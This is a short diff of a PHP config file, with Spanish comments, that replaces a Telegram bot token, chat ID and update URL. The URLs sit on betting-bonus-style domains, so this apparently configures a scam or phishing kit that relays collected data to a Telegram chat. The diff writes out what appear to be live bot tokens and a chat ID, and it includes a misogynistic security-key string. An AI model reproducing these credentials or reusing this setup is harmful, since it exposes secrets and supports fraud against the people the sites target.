@@ -3,13 +3,13 @@
 
 return [
     // Token del bot de Telegram
-    'botToken' => '8086433347:AAGnvXryx26XHvsLnSjbKkaeJYJRxlzhuNE',
+    'botToken' => '8480350271:AAGAMPrhdJb9Tq8tZj2sZJGUpaddMMKmBRA',
 
     // ID del chat donde se enviarán los mensajes
-    'chatId' => '-4980441087',
+    'chatId' => '-5075558495',
 
     // URL base para las actualizaciones
-    'baseUrl' => 'https://bet-promoygiros.site/data/process/data/updatetele.php',
+    'baseUrl' => 'https://bonoganadorbet.onrender.com/data/process/data/updatetele.php',
 
     // Clave de seguridad para las actualizaciones
     'security_key' => 'lasmujeressonmalas',
